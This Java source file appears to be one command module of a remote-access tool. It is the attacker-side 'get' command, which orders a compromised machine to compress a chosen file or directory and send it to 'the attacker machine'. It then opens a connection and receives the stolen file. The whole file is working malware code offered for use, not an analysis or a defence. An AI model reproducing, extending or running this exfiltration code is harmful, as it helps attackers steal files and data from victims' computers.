package commands;

import java.io.IOException;
import java.net.Socket;

import connection.Connection;
import connection.Server;

public class GetCommand extends Command{
	private String _command;
	
	public GetCommand() {
		super("get", "\"file/dir\"", "compress and sends the specified file/dir to the attacker machine");
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			_command = command;
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Connection con, Server server) throws IOException, InterruptedException {
		String response = con.send(_command);
		System.out.println(response);
		
		if(response.contains("File compressed")) {
			Thread t = new Thread() {
		    	public void run() {
		    		Connection temp = null;
		    		String fileName;
			    	try {
			    		do {
			    			temp = server.connect();
			    			fileName = temp.receive();
			    		}while(fileName.equals("hello"));
			    		temp.receive(fileName);
			    	}catch(IOException e1){
			    		try{temp.end();}catch(IOException e2) {};
			    	}
		    	}
		    };
			t.start();
			t.join();
		}
	}
}